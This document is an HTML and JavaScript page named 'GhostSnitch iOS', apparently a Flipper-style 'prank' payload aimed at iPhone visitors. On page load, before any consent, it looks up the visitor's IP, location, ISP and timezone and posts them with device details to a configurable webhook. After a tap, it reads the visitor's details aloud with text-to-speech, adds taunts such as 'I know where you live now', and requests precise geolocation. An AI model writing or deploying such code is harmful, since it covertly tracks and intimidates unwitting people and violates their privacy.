<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostSnitch iOS</title>
    <link rel="icon" type="image/svg+xml" href="https://tbjr.github.io/Flipper-payloads/assets/favicon.svg">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
            background: #000;
            color: #0f0;
            padding: 20px;
            margin: 0;
        }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { color: #f00; text-align: center; margin-bottom: 16px; }
        .info {
            margin: 8px 0;
            padding: 10px;
            background: #111;
            border-left: 3px solid #0f0;
            border-radius: 4px;
            word-break: break-word;
        }
        .status { color: #ff0; }
        .na     { color: #888; border-left-color: #444; }

        /* Tap-to-start gate
           iOS Safari blocks speechSynthesis.speak() unless it runs inside—or
           was initiated by—a user gesture (touch/click). Without this tap the
           TTS roast is silently dropped on every iOS device. The previous
           approach of calling main() on window.load AND on first click caused
           a double-execution race where all data gathering ran twice. */
        #gate {
            position: fixed;
            inset: 0;
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 999;
            cursor: pointer;
        }
        #gate h2 { color: #f00; font-size: 1.6rem; margin-bottom: 24px; }
        #gate p  { color: #888; font-size: 0.9rem; margin-bottom: 32px; text-align: center; padding: 0 20px; }
        #gate button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 18px 40px;
            font-size: 1.2rem;
            font-family: -apple-system, monospace;
            font-weight: bold;
            cursor: pointer;
            border-radius: 8px;
            -webkit-tap-highlight-color: transparent;
        }
        #gate button:active { opacity: 0.7; }
    </style>
</head>
<body>
    <div id="gate" onclick="startRoast()">
        <h2>👻 GhostSnitch</h2>
        <p>Tap the button to continue.<br>Trust me, you want to.</p>
        <button>Tap to Continue</button>
    </div>

    <div class="container">
        <h1>🍎 GhostSnitch iOS</h1>
        <div id="output"></div>
    </div>

    <script>
        // ── Tracker config (edit before deploying) ────────────────────────────────
        const WEBHOOK_URL = 'REPLACE_ME';
        const PRANK_ID    = (() => {
            try { return crypto.randomUUID().replace(/-/g, '').slice(0, 8).toUpperCase(); }
            catch { return Math.random().toString(36).slice(2, 10).toUpperCase(); }
        })();
        // ─────────────────────────────────────────────────────────────────────────

        const output = document.getElementById('output');
        let roastStarted = false;
        let geoData = {};

        function addInfo(text, cls = '') {
            const div = document.createElement('div');
            div.className = 'info ' + cls;
            div.textContent = text;
            output.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth' });
        }

        // Called exclusively inside the user-gesture chain that startRoast() opens.
        // Any speak() call outside that chain is silently dropped by iOS Safari.
        function speak(text) {
            addInfo('🔊 ' + text, 'status');
            if ('speechSynthesis' in window) {
                const u = new SpeechSynthesisUtterance(text);
                u.rate   = 0.95;
                u.pitch  = 1.0;
                u.volume = 1.0;
                // Prefer a non-remote English voice when available
                const voices = window.speechSynthesis.getVoices();
                const eng = voices.find(v => v.lang.startsWith('en') && !v.remote);
                if (eng) u.voice = eng;
                window.speechSynthesis.speak(u);
            }
        }

        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

        // ── Tracker helpers ──────────────────────────────────────────────────

        async function fetchGeoData() {
            try {
                const res = await fetch('https://ipwho.is/');
                geoData = await res.json();
            } catch { geoData = {}; }
        }

        async function sendDeliveryPing() {
            if (WEBHOOK_URL === 'REPLACE_ME') return;
            const ua = navigator.userAgent;
            let device = 'iPhone';
            if (ua.includes('iPad'))  device = 'iPad';
            if (ua.includes('iPod'))  device = 'iPod touch';
            const iosMatch = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
            const iosVer = iosMatch
                ? [iosMatch[1], iosMatch[2], iosMatch[3]].filter(Boolean).join('.')
                : 'Unknown';
            const loc = [geoData.city, geoData.region, geoData.country].filter(Boolean).join(', ') || 'Unknown';
            const payload = {
                username: 'GhostSnitch Tracker',
                content:  `📡 **Delivery confirmed** | ID: \`${PRANK_ID}\``,
                embeds: [{
                    title:  'iOS — Page Loaded',
                    color:  0xFF8C00,
                    fields: [
                        { name: 'Prank ID',  value: PRANK_ID,                             inline: true  },
                        { name: 'Device',    value: `${device} (iOS ${iosVer})`,          inline: true  },
                        { name: 'IP',        value: geoData.ip          || 'Unknown',     inline: true  },
                        { name: 'Location',  value: loc,                                  inline: false },
                        { name: 'ISP',       value: geoData.connection?.isp || 'Unknown', inline: true  },
                        { name: 'Timezone',  value: geoData.timezone?.id   || 'Unknown',  inline: true  },
                    ],
                    footer:    { text: 'GhostSnitch iOS v1.1 — delivery ping (before gate tap)' },
                    timestamp: new Date().toISOString()
                }]
            };
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch {}
        }

        // Fire geo fetch + delivery ping immediately on page load (before gate tap)
        window.addEventListener('load', async () => {
            await fetchGeoData();
            sendDeliveryPing();
        });

        // ── Device info ──────────────────────────────────────────────────────
        function getDeviceInfo() {
            const ua = navigator.userAgent;

            // iOS version: "OS 17_2" or "OS 17_2_1"
            const iosMatch = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
            const iosVer   = iosMatch
                ? [iosMatch[1], iosMatch[2], iosMatch[3]].filter(Boolean).join('.')
                : 'Unknown';

            // Device family — iOS UA never exposes model identifier in the UA string
            let device = 'iPhone';
            if (ua.includes('iPad'))  device = 'iPad';
            if (ua.includes('iPod'))  device = 'iPod touch';

            // Screen dimensions help narrow down the model generation
            const w = window.screen.width  * window.devicePixelRatio;
            const h = window.screen.height * window.devicePixelRatio;

            addInfo(`📱 Device: ${device}  |  iOS ${iosVer}`);
            addInfo(`📺 Physical resolution: ${Math.min(w,h)}×${Math.max(w,h)} px  (${window.devicePixelRatio}× scale)`);
            speak(`You're running iOS ${iosVer} on an ${device}. Brave, but foolish.`);
        }

        // ── RAM ──────────────────────────────────────────────────────────────
        function getRAMInfo() {
            // deviceMemory is intentionally absent from Safari (privacy decision by Apple)
            const ua = navigator.userAgent;
            let estimate = 'Unknown';
            if      (ua.includes('iPad'))   estimate = '4–16 GB';
            else if (ua.includes('iPhone')) estimate = '3–8 GB';

            addInfo(`💾 RAM: ${estimate} (estimated — deviceMemory API not in Safari)`,'na');
            speak(`I can't read your exact RAM on Safari, but your ${ua.includes('iPad') ? 'iPad' : 'iPhone'} has somewhere around ${estimate}. That's cute.`);
        }

        // ── Battery ──────────────────────────────────────────────────────────
        function getBatteryInfo() {
            // Battery Status API was removed from Safari; navigator.getBattery is absent
            if ('getBattery' in navigator) {
                navigator.getBattery().then(b => {
                    const lvl = Math.round(b.level * 100);
                    const chg = b.charging ? 'charging' : 'not charging';
                    addInfo(`🔋 Battery: ${lvl}% (${chg})`);
                    speak(`Your battery is at ${lvl} percent and ${chg}. Keep it charged.`);
                }).catch(() => {
                    addInfo('🔋 Battery: Unknown', 'na');
                });
            } else {
                addInfo('🔋 Battery: Not available (Battery API removed from Safari)', 'na');
                speak("Can't see your battery level — Apple pulled that API from Safari years ago. Smart of them.");
            }
        }

        // ── Public IP + Geolocation ──────────────────────────────────────────
        // Uses geoData pre-fetched on page load via ipwho.is (single API call)
        function getIPInfo() {
            const ip = geoData.ip;
            if (ip) {
                addInfo(`🌐 Public IP: ${ip}`);
                speak(`Your public IP is ${ip}. And I know where you live now.`);
            } else {
                addInfo('🌐 Public IP: Unknown', 'na');
                speak("Couldn't fetch your IP. VPN? Smart move.");
            }
        }

        function getGeoInfo() {
            if (geoData.ip) {
                const loc = [geoData.city, geoData.region, geoData.country].filter(Boolean).join(', ');
                const isp = geoData.connection?.isp || 'Unknown ISP';
                addInfo(`📍 Location: ${loc}  |  ISP: ${isp}`);
                speak(`You appear to be in ${geoData.city || geoData.country || 'an unknown location'}. Cozy spot.`);
            } else {
                addInfo('📍 Location: Unavailable', 'na');
            }
        }

        // ── Network ──────────────────────────────────────────────────────────
        function getNetworkInfo() {
            // Network Information API is not available in Safari (mobile or desktop)
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                const type     = conn.effectiveType || conn.type || 'Unknown';
                const downlink = conn.downlink != null ? `${conn.downlink} Mbps` : 'Unknown';
                addInfo(`📶 Network: ${type}  |  Downlink: ${downlink}`);
                speak(`Your connection is ${type}. Weak sauce.`);
            } else {
                addInfo('📶 Network: Not available (Network Information API not in Safari)', 'na');
                speak("Safari doesn't expose network type. Apple keeps secrets too.");
            }
        }

        // ── Screen ───────────────────────────────────────────────────────────
        function getScreenInfo() {
            // screen.width/height report CSS (logical) pixels, not physical pixels
            const cssW = window.screen.width;
            const cssH = window.screen.height;
            const dpr  = window.devicePixelRatio || 1;
            addInfo(`📺 Logical resolution: ${cssW}×${cssH} CSS px  |  DPR: ${dpr}×`);
            speak(`Your screen is ${cssW} by ${cssH} logical pixels. Nice resolution, I guess.`);
        }

        // ── Language ─────────────────────────────────────────────────────────
        function getLanguageInfo() {
            const langs = navigator.languages || [navigator.language || 'Unknown'];
            addInfo(`🌍 Languages: ${langs.join(', ')}`);
            speak(`You use ${langs[0]} as your primary language. Fancy.`);
        }

        // ── Location ─────────────────────────────────────────────────────────
        function getLocationHint() {
            if (!('geolocation' in navigator)) {
                addInfo('📍 Location: Not available', 'na');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const lat = pos.coords.latitude.toFixed(2);
                    const lon = pos.coords.longitude.toFixed(2);
                    const acc = Math.round(pos.coords.accuracy);
                    addInfo(`📍 Location: ${lat}, ${lon}  (±${acc} m)`);
                    speak(`Your approximate location is ${lat}, ${lon}. Cozy.`);
                },
                err => {
                    const msg = err.code === err.PERMISSION_DENIED
                        ? 'Blocked by user'
                        : err.message || 'Unavailable';
                    addInfo(`📍 Location: ${msg}`, 'na');
                    speak("Location blocked. Privacy settings are actually working for once.");
                },
                { timeout: 10000 }
            );
        }

        // ── Orchestration ────────────────────────────────────────────────────
        async function main() {
            addInfo(`🎯 Prank ID: ${PRANK_ID}`, 'status');
            speak("Hello iOS user. Let's begin.");
            await wait(2200);

            getDeviceInfo();
            await wait(2500);

            getRAMInfo();
            await wait(2500);

            getBatteryInfo();
            await wait(2000);

            getIPInfo();
            await wait(2000);

            getGeoInfo();
            await wait(2000);

            getNetworkInfo();
            await wait(2000);

            getScreenInfo();
            await wait(2000);

            getLanguageInfo();
            await wait(2000);

            getLocationHint();
            await wait(3000);

            speak("GhostSnitch iOS signing off. Sleep tight.");
            addInfo('✅ Execution complete', 'status');
        }

        // Gate tap handler — satisfies the iOS Safari user-gesture requirement
        // for speechSynthesis. main() must NOT be called anywhere outside this
        // chain or TTS will be silently blocked.
        function startRoast() {
            if (roastStarted) return;
            roastStarted = true;
            document.getElementById('gate').style.display = 'none';
            main();
        }
    </script>
</body>
</html>
